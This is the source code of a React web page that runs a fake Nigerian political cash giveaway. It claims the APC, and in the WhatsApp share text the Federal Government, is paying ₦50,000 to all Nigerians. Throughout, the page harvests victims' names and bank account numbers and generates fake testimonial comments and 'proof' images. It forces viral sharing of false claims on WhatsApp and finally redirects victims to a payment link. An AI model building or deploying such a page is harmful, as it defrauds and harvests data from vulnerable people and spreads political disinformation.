"use client";

import React, { useState, useEffect, useRef } from "react";
import "./styles.css";
import { ThumbsUp, Heart, MessageCircle, Share2, ArrowDown } from "lucide-react";

// Define the shape of a comment
interface CommentData {
  id: string;
  name: string;
  text: string;
  color: string;
  image?: string;
}

export default function APCCampaignPage() {
  // --- STATE MANAGEMENT ---
  const [currentPage, setCurrentPage] = useState<number>(1);
  const [showNotif, setShowNotif] = useState<boolean>(false);
  
  // Form State
  const [nameInput, setNameInput] = useState<string>("");
  const [accountInput, setAccountInput] = useState<string>("");
  const [appNum, setAppNum] = useState<string>("");
  
  // Progress State
  const [progress, setProgress] = useState<number>(0);
  const [clickIndex, setClickIndex] = useState<number>(0);
  const [isCoolingDown, setIsCoolingDown] = useState<boolean>(false);
  const [cooldownText, setCooldownText] = useState<string>("SHARE");

  // Comments State
  const [comments, setComments] = useState<CommentData[]>([]);
  const [newComment, setNewComment] = useState<string>("");
  const [commentCount, setCommentCount] = useState<number>(50);
  const commentsEndRef = useRef<HTMLDivElement>(null);

  // Data Arrays
  const progressIncrements = [20, 20, 20, 10, 5, 5, 5, 2, 2, 2, 2, 1, 1, 1, 1, 1, 1, 1];
  const names = ["Adewale J.", "Chinedu O.", "Amina Y.", "Tunde A.", "Blessing O.", "Emeka N.", "Ngozi E.", "Ibrahim M.", "Folake A.", "Segun O.", "Chioma N.", "Musa A.", "Yetunde B."];
  const texts = [
    "Just got mine, thank you APC!", "Is this still working?", "Wow, it dropped immediately.",
    "Received my alert just now.", "How long does it take to reflect?", "God bless Dr Bernard Doro.",
    "Finally, something for the youths.", "I was doubting at first but it came through.",
    "Please I haven't received mine.", "This is the best campaign bonus offer I've seen.",
    "Just shared to 5 groups, waiting for my alert.", "My account has been credited, God is good.",
    "It worked perfectly for me!", "Just claimed my ₦50,000!"
  ];
  const colors = ["#ff6b6b", "#f39c12", "#3498db", "#9b59b6", "#2ecc71", "#1abc9c", "#e67e22"];
  
  // Added your two new images here, alongside the old one
  const proofImages = [
    "https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEg3VWsxvacYcoxDgB2zhQ3j8h-SMmG_qoQUmUHz-BekiTksX_ofjilOn6mBlcUhgQWn65WoARr_fXO7US_F3U35B_TQPp6HIkD0GFZgtiGEWqeHEB8Hrg9m7QjDoxfWTNvkNg-9TNY6e6cJkZMAQAhm1xJR87Q2H8KuE9Fg7M9ttzmrM_jY825nAzppXnDP/s739/images%20%283%29.jpeg",
    "https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjqOpHJ1G05tKQY5Vb64YAPN2UCEZLwQWBFZIpZGNivOZsPzMb1hRN7Og7F4wNGpDFF4FBffXfJijYK840s6eODj5_AWaDWwp_2LOFdLBoil1aALQ0_SXtq_OGvn102K0XiXCkqKWResyMyxXC7bB-w5wEfedvwCiqmE3D-4QqrpD05sVsJ-t9eqHXxlHGo/s597/images%20%282%29.jpeg",
    "https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEimt6_G0ziyABWcDpQ2R_Ch5RrPLocF8pnhWg0z6Z3dUJ4tfoRMu5yuis19Pg4Lthk2DMejExlJU9y0XfMaUCDos4WSDgghgezkfb-ma2nnW7_2yez_uAua4CI90dThAOahWJzYKi7daeVxkrmQUeUil1hUXFKk9NbgIsx5a3xnkqIwVLV8k5v6LgBnArVj/s656/images%20%281%29.jpeg"
  ];

  // --- EFFECTS ---
  // 1. Show Notification after 1s
  useEffect(() => {
    const timer = setTimeout(() => setShowNotif(true), 1000);
    return () => clearTimeout(timer);
  }, []);

  // 2. Auto-generate fake comments
  useEffect(() => {
    if (comments.length >= 50) return;

    const generateComment = () => {
      const randomName = names[Math.floor(Math.random() * names.length)];
      const randomText = texts[Math.floor(Math.random() * texts.length)];
      const randomColor = colors[Math.floor(Math.random() * colors.length)];
      const hasImage = Math.random() < 0.25; // 25% chance to include an image

      const newFakeComment: CommentData = {
        id: `fake-${Date.now()}-${Math.random()}`,
        name: randomName,
        text: randomText,
        color: randomColor,
        image: hasImage ? proofImages[Math.floor(Math.random() * proofImages.length)] : undefined,
      };

      setComments((prev) => [...prev, newFakeComment]);
      setCommentCount((prev) => prev + 1);

      // Random delay between 1.5s and 3s for next comment
      const nextDelay = Math.random() * 1500 + 1500;
      setTimeout(generateComment, nextDelay);
    };

    const initialDelay = setTimeout(generateComment, 1000);
    return () => clearTimeout(initialDelay);
  }, [comments.length]);

  // --- HANDLERS ---
  const handleFormSubmit = () => {
    if (!nameInput.trim() || !accountInput.trim()) {
      alert("Please fill in your Name and Account Number.");
      return;
    }

    const randomAppNum = "APP-" + Math.random().toString(36).substring(2, 7).toUpperCase();
    setAppNum(randomAppNum);
    setCurrentPage(3);

    setTimeout(() => {
      setCurrentPage(4);
    }, 3000);
  };

  const handleShare = () => {
    if (isCoolingDown) return;

    // 1. Open WhatsApp
    const currentUrl = window.location.href;
    const message = `*FG N50,000 Naira Cash Transfer Ongoning, No BVN Required*\n\nThe Federal Government Of Nigeria through The Minister of Humanitarian Affairs and Poverty Reduction, Dr Bernard Doro is Giving out N50,000 Cash Transfer to All Nigerians, i just got mine. \n\n*Get Yours Here Now* 👇\n${currentUrl}\n\n*SHARE WITH EVERYONE*`;
    window.open(`https://wa.me/?text=${encodeURIComponent(message)}`, "_blank");

    // 2. Update Progress
    if (clickIndex < progressIncrements.length) {
      const newProgress = Math.min(progress + progressIncrements[clickIndex], 100);
      setProgress(newProgress);
      setClickIndex((prev) => prev + 1);
    }

    // 3. Start Cooldown
    setIsCoolingDown(true);
    let timeLeft = 30;
    setCooldownText(`Wait ${timeLeft}s...`);

    const timer = setInterval(() => {
      timeLeft--;
      setCooldownText(`Wait ${timeLeft}s...`);

      if (timeLeft <= 0) {
        clearInterval(timer);
        setIsCoolingDown(false);
        setCooldownText(progress >= 100 ? "COMPLETE" : "SHARE");
      }
    }, 1000);
  };

  const handleWithdraw = () => {
    const paystackLink = "https://paystack.com/pay/YOUR_PLACEHOLDER_LINK_HERE";
    if (progress >= 100) {
      window.location.href = paystackLink;
    } else {
      alert("Please complete the verification process first by sharing.");
    }
  };

  const handleUserComment = () => {
    if (!newComment.trim()) return;
    
    const userComment: CommentData = {
      id: `user-${Date.now()}`,
      name: "Anonymous", // Forces name to be Anonymous
      text: newComment,
      color: "#888", // Grey color for anonymous
    };

    // Prepend user comment to top of list
    setComments((prev) => [userComment, ...prev]);
    setNewComment("");
    setCommentCount((prev) => prev + 1);
  };

  // --- RENDER ---
  return (
    <div className="container">
      {showNotif && (
        <div className="fake-notification">
          <span>N50,000 sent to Adewale Johnson 6746785789</span>
        </div>
      )}

      {/* PAGE 1 */}
      {currentPage === 1 && (
        <div className="page active">
          <img src="https://apcbonus.up-now.space/apcbonus.png" alt="APC Banner" className="main-image" />
          <div className="text-center">
            <div className="title">All Progressive Congress 2027 Instant<br />₦50,000 Naira Campaign Giveaway</div>
            <div className="subtitle">POWERED BY: APC</div>
            <p>The All Progressive Congress (APC) is<br />giving out Instant free ₦50,000 Naira as<br />part of 2027 campaign for all Nigerians</p>
            <button className="btn-blue" onClick={() => setCurrentPage(2)}>Accept ₦50,000</button>
            <div className="red-text">ENDING 7TH NOVEMBER</div>
          </div>
        </div>
      )}

      {/* PAGE 2 */}
      {currentPage === 2 && (
        <div className="page active">
          <div className="text-center" style={{ paddingTop: "30px" }}>
            <div className="form-group">
              <label>Name:</label>
              <input type="text" value={nameInput} onChange={(e) => setNameInput(e.target.value)} placeholder="Enter your name" />
            </div>
            <div className="form-group">
              <label>Account number:</label>
              <input type="tel" value={accountInput} onChange={(e) => setAccountInput(e.target.value)} placeholder="Enter your Account number" />
            </div>
            <button className="btn-blue" onClick={handleFormSubmit}>SUBMIT</button>
            <div className="red-text">ENDING 7TH NOVEMBER</div>
          </div>
        </div>
      )}

      {/* PAGE 3 */}
      {currentPage === 3 && (
        <div className="page active">
          <div className="text-center" style={{ paddingTop: "50px" }}>
            <p style={{ fontSize: "18px", marginBottom: "20px" }}>Please wait...</p>
            <div className="spinner"></div>
            <p style={{ fontSize: "18px", marginTop: "20px" }}>Checking your name....</p>
            <div className="red-text" style={{ marginTop: "50px" }}>ENDING 7TH NOVEMBER</div>
          </div>
        </div>
      )}

      {/* PAGE 4 */}
      {currentPage === 4 && (
        <div className="page active">
          <div style={{ padding: "20px" }}>
            <p style={{ fontSize: "16px", lineHeight: "1.5", marginBottom: "15px" }}>
              Congratulation! Your Application Number is <span style={{ fontWeight: "bold", color: "red" }}>{appNum}</span><br /><br />
              NAME: <span style={{ color: "green", fontWeight: "bold" }}>{nameInput}</span>, Account number <span style={{ color: "green", fontWeight: "bold" }}>{accountInput}</span><br /><br />
              Your ₦50,000 Naira is still <span style={{ color: "red", fontWeight: "bold" }}>pending</span> because you have not completed the Human verification process <span style={{ color: "green", fontWeight: "bold" }}>Please complete the verification process to withdraw your money Now</span>
            </p>

            <h3 style={{ color: "red", marginBottom: "15px" }}>How to proceed: to the withdrawal form</h3>
            <p style={{ fontSize: "14px", lineHeight: "1.6", marginBottom: "20px" }}>
              1. Share it to 15-20 groups or with friends on WhatsApp (Click the "SHARE" button below).<br /><br />
              2. Your registration will automatically complete once the GREEN verification bar is filled.<br /><br />
              3. Click "Withdraw Cash now" to claim your your ₦50,000 ..
            </p>
            <div style={{ display: "flex", justifyContent: "center", marginBottom: "10px" }}>
               <ArrowDown size={32} color="#555" />
            </div>

            <button 
              className="btn-blue" 
              onClick={handleShare} 
              disabled={isCoolingDown || progress >= 100}
              style={{ backgroundColor: progress >= 100 ? "#888" : "#008000" }}
            >
              {cooldownText}
            </button>

            <div className="progress-container">
              <div className="progress-bar" style={{ width: `${progress}%` }}></div>
              <div className="progress-text">{progress}%</div>
            </div>

            <button className="btn-blue" onClick={handleWithdraw}>Withdraw Cash now</button>
            <div className="red-text">ENDING 7TH NOVEMBER</div>
          </div>
        </div>
      )}

      {/* COMMENTS SECTION */}
      <div className="comments-section">
        <div className="comments-header">
          <span style={{ display: "flex", alignItems: "center", gap: "5px" }}>
            <ThumbsUp size={14} /> <Heart size={14} color="red" /> 347
          </span>
          <span>{commentCount} comments  20 shares</span>
        </div>
        
        <div className="comments-actions">
          <span style={{ display: "flex", alignItems: "center", gap: "5px" }}><ThumbsUp size={16} /> Like</span>
          <span style={{ display: "flex", alignItems: "center", gap: "5px" }}><MessageCircle size={16} /> Comment</span>
          <span style={{ display: "flex", alignItems: "center", gap: "5px" }}><Share2 size={16} /> Share</span>
        </div>

        {/* User Comment Input */}
        <div className="user-comment-box">
          <input 
            type="text" 
            placeholder="Write a comment as Anonymous..." 
            value={newComment}
            onChange={(e) => setNewComment(e.target.value)}
            onKeyDown={(e) => e.key === 'Enter' && handleUserComment()}
          />
          <button onClick={handleUserComment}>Post</button>
        </div>

        {/* Comments List */}
        <div>
          {comments.map((comment) => (
            <div key={comment.id} className="comment">
              <div className="avatar" style={{ backgroundColor: comment.color }}>
                {comment.name.substring(0, 2).toUpperCase()}
              </div>
              <div className="comment-content">
                <div className="comment-name">{comment.name}</div>
                {comment.text}
                {comment.image && <img src={comment.image} alt="Proof" className="comment-img" />}
              </div>
            </div>
          ))}
          <div ref={commentsEndRef} />
        </div>
      </div>
    </div>
  );
}
